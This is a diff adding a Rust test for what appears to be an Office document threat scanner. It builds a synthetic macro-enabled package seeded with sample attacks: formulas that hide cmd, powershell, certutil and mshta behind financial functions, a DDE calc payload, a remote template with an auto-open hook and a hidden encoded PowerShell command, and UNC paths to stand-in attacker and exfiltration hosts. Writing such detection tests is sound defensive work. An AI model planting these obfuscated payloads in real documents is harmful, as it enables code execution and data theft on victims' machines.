@@ -7062,3 +7062,209 @@ fn e2e_powerpoint_sync_word_keymap_webpublish_and_irr_mirr_inspection() {
         "JSON missing VBA-CELL-079"
     );
 }
+
+#[test]
+fn e2e_handout_glossary_customdata_and_amortization_inspection() {
+    let content_types = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
+  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
+  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+  <Override PartName="/ppt/handoutMasters/handoutMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.handoutMaster+xml"/>
+  <Override PartName="/word/glossary/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>
+  <Override PartName="/xl/customData/customData1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.customData+xml"/>
+</Types>"#;
+
+    let package_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"#;
+
+    let workbook_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+  <sheets>
+    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
+  </sheets>
+</workbook>"#;
+
+    let workbook_rels = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
+  <Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/>
+</Relationships>"#;
+
+    // Formulas using PPMT, CRITBINOM, EFFECT, NOMINAL resolving to cmd.exe, powershell, certutil, mshta
+    let sheet1_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+  <sheetData>
+    <row r="1">
+      <c r="A1" t="str">
+        <f>CHAR(PPMT(0, 1, 10, -990)) &amp; &quot;md.exe&quot;</f>
+      </c>
+      <c r="B1" t="str">
+        <f>CHAR(CRITBINOM(6, 0.5, 0.5) * 37 + 1) &amp; &quot;owershell&quot;</f>
+      </c>
+      <c r="C1" t="str">
+        <f>CHAR(EFFECT(0.99, 1) * 100) &amp; &quot;ertutil&quot;</f>
+      </c>
+      <c r="D1" t="str">
+        <f>CHAR(NOMINAL(1.09, 1) * 100 + 0.5) &amp; &quot;shta&quot;</f>
+      </c>
+    </row>
+  </sheetData>
+</worksheet>"#;
+
+    // 1. PowerPoint handout master with remote UNC resource path and cloaked DDE formula (VBA-CELL-080)
+    let ppt_handout_master_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:handoutMaster xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:cSld>
+    <p:spTree>
+      <p:sp>
+        <p:txBody>
+          <a:p xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
+            <a:r>
+              <a:t>cmd|'/c calc'!A1</a:t>
+            </a:r>
+          </a:p>
+        </p:txBody>
+      </p:sp>
+    </p:spTree>
+  </p:cSld>
+  <p:theme href="\\attacker-host\share\malicious_theme.thmx"/>
+</p:handoutMaster>"#;
+
+    // 2. Word glossary settings with remote template auto-open hook and staged powershell (VBA-CELL-081)
+    let word_glossary_settings_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+  <w:attachedTemplate w:val="\\remote-template-server\templates\malicious.dotm"/>
+  <w:autoOpen w:val="true"/>
+  <w:cmdLine>powershell.exe -NoP -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA==</w:cmdLine>
+</w:settings>"#;
+
+    // 3. Excel custom data with remote UNC destination and serialized .NET binary formatter marker (VBA-CELL-082)
+    let xl_custom_data_xml = r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<customData xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+  target="\\exfil-smb-server\leak\customdata">
+  <binaryData>AAEAAAD/////System.Windows.Forms.AxHost+State</binaryData>
+</customData>"#;
+
+    let cfb = synthesize_cfb("VBAProject", "Module1", "Sub Test()\nEnd Sub\n", &[]);
+
+    let entries: &[(&str, &[u8])] = &[
+        ("[Content_Types].xml", content_types.as_bytes()),
+        ("_rels/.rels", package_rels.as_bytes()),
+        ("xl/workbook.xml", workbook_xml.as_bytes()),
+        ("xl/_rels/workbook.xml.rels", workbook_rels.as_bytes()),
+        ("xl/vbaProject.bin", cfb.as_slice()),
+        ("xl/worksheets/sheet1.xml", sheet1_xml.as_bytes()),
+        (
+            "ppt/handoutMasters/handoutMaster1.xml",
+            ppt_handout_master_xml.as_bytes(),
+        ),
+        (
+            "word/glossary/settings.xml",
+            word_glossary_settings_xml.as_bytes(),
+        ),
+        (
+            "xl/customData/customData1.xml",
+            xl_custom_data_xml.as_bytes(),
+        ),
+    ];
+
+    let zip_bytes = synthesize_zip(entries);
+    let options = AnalysisOptions::default();
+    let inspection = inspect_macro_file(&zip_bytes, &options).expect("inspection should succeed");
+
+    let threats = &inspection.extracted.cell_threats;
+
+    // 1. Verify PowerPoint Handout or Notes Master threats (VBA-CELL-080)
+    assert!(
+        threats
+            .iter()
+            .any(|t| t.threat_kind == "PowerPointHandoutOrNotesMasterAnomaly"
+                && (t.coordinate.contains("handoutNotesMaster:uncCoercion")
+                    || t.coordinate.contains("handoutNotesMaster:cloakedDde"))),
+        "Should detect PowerPointHandoutOrNotesMasterAnomaly (VBA-CELL-080): {threats:?}"
+    );
+
+    // 2. Verify Word Glossary Settings or Font Table threats (VBA-CELL-081)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "WordGlossarySettingsOrFontTableAnomaly"
+                && (t.coordinate.contains("glossarySettings:macroHook")
+                    || t.coordinate.contains("glossarySettings:stagedCommand"))
+        ),
+        "Should detect WordGlossarySettingsOrFontTableAnomaly (VBA-CELL-081): {threats:?}"
+    );
+
+    // 3. Verify Excel Custom Property or Custom Data threats (VBA-CELL-082)
+    assert!(
+        threats.iter().any(
+            |t| t.threat_kind == "ExcelCustomPropertyOrCustomDataAnomaly"
+                && (t.coordinate.contains("customData:uncCoercion")
+                    || t.coordinate.contains("customData:serializedPayload"))
+        ),
+        "Should detect ExcelCustomPropertyOrCustomDataAnomaly (VBA-CELL-082): {threats:?}"
+    );
+
+    // 4. Verify dynamic formula de-obfuscation
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "A1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("cmd")),
+        "Cell A1 should resolve cmd threat through PPMT evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "B1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("powershell")),
+        "Cell B1 should resolve powershell threat through CRITBINOM evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "C1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("certutil")),
+        "Cell C1 should resolve certutil threat through EFFECT evaluation: {threats:?}"
+    );
+    assert!(
+        threats.iter().any(|t| t.cell_ref == "D1"
+            && t.threat_kind == "DeobfuscatedThreat"
+            && t.description.contains("mshta")),
+        "Cell D1 should resolve mshta threat through NOMINAL evaluation: {threats:?}"
+    );
+
+    // 5. Verify SARIF contains rules VBA-CELL-080, VBA-CELL-081, VBA-CELL-082
+    let sarif = inspection_to_sarif(
+        &inspection,
+        "file:///test/handout_glossary_customdata_amortization.xlsm",
+    );
+    assert!(
+        sarif.contains("VBA-CELL-080"),
+        "SARIF must contain VBA-CELL-080 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-081"),
+        "SARIF must contain VBA-CELL-081 rule"
+    );
+    assert!(
+        sarif.contains("VBA-CELL-082"),
+        "SARIF must contain VBA-CELL-082 rule"
+    );
+
+    // 6. Verify JSON contains rule_id VBA-CELL-080, VBA-CELL-081, VBA-CELL-082
+    let json = inspect_to_json(&inspection, Disclosure::IncludeSource);
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-080\""),
+        "JSON missing VBA-CELL-080"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-081\""),
+        "JSON missing VBA-CELL-081"
+    );
+    assert!(
+        json.contains("\"rule_id\":\"VBA-CELL-082\""),
+        "JSON missing VBA-CELL-082"
+    );
+}
